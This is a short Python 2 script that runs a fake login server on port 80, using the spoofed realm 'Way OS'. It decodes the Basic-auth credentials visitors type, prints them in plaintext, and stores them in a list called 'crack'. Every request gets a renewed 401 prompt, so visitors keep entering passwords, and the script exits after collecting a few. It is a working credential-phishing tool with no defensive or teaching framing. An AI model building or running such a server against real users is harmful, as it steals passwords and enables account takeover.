import sys
import base64
import SocketServer
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

crack = []

class Handler(BaseHTTPRequestHandler):
    ''' Main class to present webpages and authentication. '''
    def do_HEAD(self):
        print "send header"
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_AUTHHEAD(self):
        print "Send Auth Request"
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm=\"Way OS\"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        ''' Present frontpage with user authentication. '''

        if self.headers.getheader('Authorization') == None:
            self.do_AUTHHEAD()
            self.wfile.write('no auth header received')
            pass
        elif len(self.headers.getheader('Authorization')) > 6:
            resdata = self.headers.getheader('Authorization')
            print resdata
            resdata = resdata[6:]
            resdata = base64.b64decode(resdata)
            print resdata
            crack.append(resdata)
            if len(crack) > 3:
                sys.exit(2)
            self.do_AUTHHEAD()
            #self.wfile.write('authenticated!')
            pass
        else:
            self.do_AUTHHEAD()
        #    self.wfile.write('not authenticated')
        #    pass


httpd = SocketServer.TCPServer(("", 80), Handler)

httpd.serve_forever()